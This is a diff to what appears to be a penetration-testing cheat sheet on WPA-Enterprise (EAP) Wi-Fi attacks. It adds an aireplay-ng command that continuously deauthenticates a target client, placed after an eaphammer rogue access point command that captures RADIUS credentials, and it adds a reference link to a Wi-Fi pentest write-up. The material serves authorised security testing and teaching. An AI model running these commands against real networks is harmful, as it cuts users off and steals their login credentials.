@@ -15,6 +15,9 @@ WPA EAP refers to the use of the Extensible Authentication Protocol (EAP) within
 
     # launch attack
     ./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
+
+    # deauth users and wait for them to connect to our AP
+    aireplay-ng -0 0 -a MAC_ADDR_AP -c MAC_ADDR_CIBLE wlan0mon
     ```
 
 * [Stealing RADIUS Credentials Using EAPHammer](https://github.com/s0lst1c3/eaphammer/wiki/II.-Stealing-RADIUS-Credentials-Using-EAPHammer)
@@ -109,4 +112,4 @@ Sniff > Unified sniffing > Hacker Interface
 
 ## References
 
-* [TODO](#)
+* [Retex : Test d’intrusion Wi-Fi (WPA2-Enterprise) - @virtualsamuraii](https://virtualsamuraii.github.io/network/retex-pentest-wifi-wpa2-enterprise/)
